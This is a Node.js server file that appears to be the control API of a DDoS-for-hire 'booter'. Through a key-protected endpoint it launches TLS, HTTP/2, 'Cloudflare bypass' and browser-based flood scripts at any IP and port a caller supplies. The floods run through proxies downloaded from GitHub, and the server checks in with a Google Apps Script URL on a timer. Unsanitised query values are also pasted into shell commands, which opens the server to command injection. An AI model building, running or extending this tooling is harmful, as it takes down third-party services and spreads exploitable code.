const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const https = require('https');

const app = express();
app.use(express.json());

const PORT = 3000;
const API_KEY = "rfpromax1337";
const SCRIPTS_DIR = path.join(__dirname, 'scripts');
const PROXY_FILE = path.join(SCRIPTS_DIR, 'proxy.txt');

// Load config
let config = {
    server_domain: "localhost",
    server_port: 3000,
    ping_enabled: true,
    ping_interval: 30000,
    gas_url: "https://script.google.com/macros/s/AKfycbxavnz3eaPAy3CwIUsM4bsv3JFhhi4rwGCT3f1VDKoLl7MjaA9_jj7YrKfGeIvjgSLRsA/exec"
};

if (fs.existsSync('./config.json')) {
    const loadedConfig = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
    config = { ...config, ...loadedConfig };
}

const GAS_URL = config.gas_url;
const SERVER_DOMAIN = config.server_domain;
const PING_ENABLED = config.ping_enabled;
const PING_INTERVAL = config.ping_interval;

// SINGLE PROXY URL
const PROXY_URL = 'https://raw.githubusercontent.com/tashijau059-hub/arch/refs/heads/main/proxy.txt';

if (!fs.existsSync(SCRIPTS_DIR)) fs.mkdirSync(SCRIPTS_DIR, { recursive: true });

// ==================== PING FUNCTION ====================
function pingGoogleSheets() {
    if (!PING_ENABLED) return;

    const serverUrl = `https://${SERVER_DOMAIN}`;
    const pingUrl = `${GAS_URL}?action=ping&url=${encodeURIComponent(serverUrl)}`;

    console.log(`[PING] Sending: ${serverUrl}`);

    https.get(pingUrl, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            console.log(`[PING] ${new Date().toISOString()} - ${serverUrl} - Status: ${res.statusCode}`);
        });
    }).on('error', (err) => {
        console.log(`[PING ERROR] ${err.message}`);
    });
}

// ==================== VERIFY API KEY ====================
function verifyApiKey(req, res, next) {
    const apiKey = req.query.api_key;
    if (apiKey !== API_KEY) {
        return res.status(401).json({ error: 'Invalid API Key' });
    }
    next();
}

// ==================== CLEAN PROXY FUNCTION ====================
function cleanProxyUrl(proxy) {
    // Remove http://, https://, socks4://, socks5:// prefixes
    let cleanProxy = proxy.replace(/^(https?:\/\/|socks[45]:\/\/)/i, '');
    return cleanProxy;
}

// ==================== PROXY DOWNLOAD ====================
function downloadProxy() {
    return new Promise((resolve, reject) => {
        https.get(PROXY_URL, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data));
        }).on('error', reject);
    });
}

async function updateProxies() {
    try {
        const content = await downloadProxy();
        const lines = content.split('\n');
        const proxies = [];

        for (const line of lines) {
            if (!line.trim()) continue;
            let proxy = line.trim();

            // For TLSV2, clean the proxy (remove prefixes)
            // We'll store clean proxies without prefixes
            let cleanProxy = cleanProxyUrl(proxy);
            proxies.push(cleanProxy);
        }

        const uniqueProxies = [...new Set(proxies)];
        fs.writeFileSync(PROXY_FILE, uniqueProxies.join('\n'));
        console.log(`[PROXY] Loaded ${uniqueProxies.length} clean proxies (prefixes removed)`);
        return uniqueProxies.length;
    } catch (err) {
        console.log(`[ERROR] Failed to download proxies: ${err.message}`);
        if (fs.existsSync(PROXY_FILE)) {
            let proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
            // Clean existing proxies in file as well
            proxies = proxies.map(p => cleanProxyUrl(p));
            fs.writeFileSync(PROXY_FILE, proxies.join('\n'));
            console.log(`[PROXY] Using ${proxies.length} clean proxies from local file`);
            return proxies.length;
        }
        return 0;
    }
}

// Function to get clean proxies for TLSV2 specifically
function getCleanProxiesForTLSV2() {
    if (!fs.existsSync(PROXY_FILE)) return [];
    let proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
    // Ensure all proxies are clean
    proxies = proxies.map(p => cleanProxyUrl(p));
    return proxies;
}

// ==================== CREATE DEFAULT UA.TXT ====================
function createDefaultUaFile() {
    const uaFilePath = path.join(SCRIPTS_DIR, 'ua.txt');
    if (!fs.existsSync(uaFilePath)) {
        const defaultUa = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
        ];
        fs.writeFileSync(uaFilePath, defaultUa.join('\n'));
        console.log(`[UA] Created default ua.txt with ${defaultUa.length} user-agents`);
    }
}

// ==================== API ENDPOINT ====================
app.get('/api', verifyApiKey, async (req, res) => {
    let { ip, method, port, time, threads, connections, streams, fingerprint, extra, rate, browser_count, conn_timeout, rps } = req.query;

    if (!ip || !method || !port || !time) {
        return res.status(400).json({ error: 'Missing: ip, method, port, time required' });
    }

    const normalizedMethod = method.toLowerCase();
    const parsedPort = parseInt(port);
    const parsedTime = parseInt(time);
    const parsedThreads = threads ? parseInt(threads) : 10;
    const parsedConnections = connections ? parseInt(connections) : 1;
    const parsedStreams = streams ? parseInt(streams) : 1;
    const parsedRate = rate ? parseInt(rate) : 100;
    const fingerprintEnabled = fingerprint === 'true' || fingerprint === true;
    const extraEnabled = extra === 'true' || extra === true;

    // Browser method specific parameters
    const parsedBrowserCount = browser_count ? parseInt(browser_count) : 5;
    const parsedConnTimeout = conn_timeout ? parseInt(conn_timeout) : 30000;
    const parsedRps = rps ? parseInt(rps) : 10;

    if (isNaN(parsedPort) || isNaN(parsedTime)) {
        return res.status(400).json({ error: 'port and time must be numbers' });
    }

    if (parsedTime <= 0 || parsedTime > 3600) {
        return res.status(400).json({ error: 'time must be between 1 and 3600 seconds' });
    }

    if (parsedPort <= 0 || parsedPort > 65535) {
        return res.status(400).json({ error: 'port must be between 1 and 65535' });
    }

    let target;
    if (parsedPort === 443) {
        target = `https://${ip}`;
    } else if (parsedPort === 80) {
        target = `http://${ip}`;
    } else {
        target = `http://${ip}:${parsedPort}`;
    }

    const proxyCount = await updateProxies();
    if (proxyCount === 0) {
        return res.status(500).json({ error: 'No proxies available' });
    }

    let command = '';
    let scriptPath = '';

    // Method TLS (TCP/TLS Flood via proxy)
    if (normalizedMethod === 'tls') {
        scriptPath = path.join(SCRIPTS_DIR, 'TLS.js');
        if (!fs.existsSync(scriptPath)) {
            return res.status(404).json({ error: 'TLS.js not found' });
        }
        const concurrent = 50;
        command = `node ${scriptPath} ${ip} ${parsedPort} ${PROXY_FILE} ${concurrent} ${parsedTime}`;

        // Method TLSV2 (HTTP2 Flood via proxy with stable reconnect)
    } else if (normalizedMethod === 'tlsv2') {
        scriptPath = path.join(SCRIPTS_DIR, 'TLSV2.js');
        if (!fs.existsSync(scriptPath)) {
            return res.status(404).json({ error: 'TLSV2.js not found' });
        }

        // Get clean proxies specifically for TLSV2
        const cleanProxies = getCleanProxiesForTLSV2();
        const tempProxyFile = path.join(SCRIPTS_DIR, 'proxy_tlsv2_clean.txt');
        fs.writeFileSync(tempProxyFile, cleanProxies.join('\n'));

        const rateParam = 50;
        command = `node ${scriptPath} ${target} ${parsedTime} ${rateParam} ${parsedThreads} ${tempProxyFile}`;

        console.log(`[TLSV2] Using clean proxies (without http://, https://, socks:// prefixes)`);
        console.log(`[TLSV2] Sample clean proxy: ${cleanProxies[0] || 'none'}`);

        // Method CF (Cloudflare Bypass - HTTP2 with proxy)
    } else if (normalizedMethod === 'cf') {
        scriptPath = path.join(SCRIPTS_DIR, 'CF-BYPASS.js');
        if (!fs.existsSync(scriptPath)) {
            return res.status(404).json({ error: 'CF-BYPASS.js not found' });
        }
        const methodType = 'POST';
        const rateParam = 100;
        const randomLength = 10;
        const randomType = 'y';
        command = `node ${scriptPath} ${methodType} ${target} ${parsedTime} ${parsedThreads} ${rateParam} ${PROXY_FILE} ${randomLength} ${randomType}`;

        // Method FAST / H2-FAST (Advanced HTTP2 Flood with AI fingerprint)
    } else if (normalizedMethod === 'fast' || normalizedMethod === 'h2fast') {
        scriptPath = path.join(SCRIPTS_DIR, 'CF-BYPASS.js');
        if (!fs.existsSync(scriptPath)) {
            return res.status(404).json({ error: 'CF-BYPASS.js (H2-FAST) not found' });
        }

        command = `node ${scriptPath} ` +
            `--target ${target} ` +
            `--time ${parsedTime} ` +
            `--threads ${parsedThreads} ` +
            `--rate ${parsedRate} ` +
            `--proxy ${PROXY_FILE} ` +
            `--connections ${parsedConnections} ` +
            `--streams ${parsedStreams}`;

        if (fingerprintEnabled) command += ` --fingerprint true`;
        if (extraEnabled) command += ` --extra true`;

        const httpMethod = req.query.http_method || 'GET';
        command += ` --methods ${httpMethod}`;

        const httpVersion = req.query.http_version || '2';
        command += ` --http ${httpVersion}`;

        if (req.query.set_cookie === 'true') command += ` --set-cookie true`;
        if (req.query.cache === 'false') command += ` --cache false`;
        if (req.query.referer) command += ` --referer ${req.query.referer}`;

        // Method BROWSER (Browser Engine - Real browser simulation)
    } else if (normalizedMethod === 'browser') {
        scriptPath = path.join(SCRIPTS_DIR, 'Browser.js');
        if (!fs.existsSync(scriptPath)) {
            return res.status(404).json({ error: 'Browser.js not found' });
        }

        // Format: node Browser.js <target> <time> <browser_counts> <httpversion> <conn_timeout> <rps> <proxyfile>
        const httpVersion = req.query.http_version || 'HTTP/1.1';
        command = `node ${scriptPath} ${target} ${parsedTime} ${parsedBrowserCount} ${httpVersion} ${parsedConnTimeout} ${parsedRps} ${PROXY_FILE}`;

        console.log(`[BROWSER] Browser Count: ${parsedBrowserCount}, Timeout: ${parsedConnTimeout}ms, RPS: ${parsedRps}`);

    } else {
        return res.status(400).json({
            error: 'Unknown method. Use: tls, tlsv2, cf, fast, or browser',
            available_methods: ['tls', 'tlsv2', 'cf', 'fast', 'browser']
        });
    }

    console.log(`[RUN] ${normalizedMethod} | ${ip}:${parsedPort} | ${parsedTime}s | Threads: ${parsedThreads}`);
    console.log(`[CMD] ${command}`);

    const child = exec(command, { timeout: (parsedTime + 30) * 1000 });
    child.unref();

    res.json({
        status: 'ok',
        method: normalizedMethod,
        target: `${ip}:${parsedPort}`,
        duration: parsedTime,
        threads: parsedThreads,
        connections: parsedConnections,
        streams: parsedStreams,
        rate: parsedRate,
        fingerprint: fingerprintEnabled,
        extra: extraEnabled,
        ...(normalizedMethod === 'browser' && {
            browser_count: parsedBrowserCount,
            conn_timeout: parsedConnTimeout,
            rps: parsedRps
        }),
        proxies: proxyCount
    });
});

// ==================== HEALTH CHECK ====================
app.get('/health', (req, res) => {
    let proxyCount = fs.existsSync(PROXY_FILE) ? fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim()).length : 0;
    res.json({
        status: 'running',
        port: PORT,
        proxies: proxyCount,
        ping_enabled: PING_ENABLED,
        ping_url: `https://${SERVER_DOMAIN}`,
        available_methods: ['tls', 'tlsv2', 'cf', 'fast', 'browser']
    });
});

// ==================== START SERVER ====================
app.listen(PORT, () => {
    console.log(`\n========================================`);
    console.log(`RF-47 Network Server Started`);
    console.log(`Port: ${PORT}`);
    console.log(`API Key: ${API_KEY}`);
    console.log(`Methods: tls, tlsv2, cf, fast, browser`);
    console.log(`========================================\n`);

    createDefaultUaFile();

    if (PING_ENABLED) {
        console.log(`[PING] Enabled`);
        console.log(`[PING] Server URL: https://${SERVER_DOMAIN}`);
        console.log(`[PING] GAS URL: ${GAS_URL}`);
        console.log(`[PING] Interval: ${PING_INTERVAL / 1000} seconds`);

        setTimeout(() => {
            console.log(`[PING] Sending first ping...`);
            pingGoogleSheets();
        }, 2000);

        setInterval(() => {
            pingGoogleSheets();
        }, PING_INTERVAL);
    } else {
        console.log(`[PING] Disabled by config`);
    }
});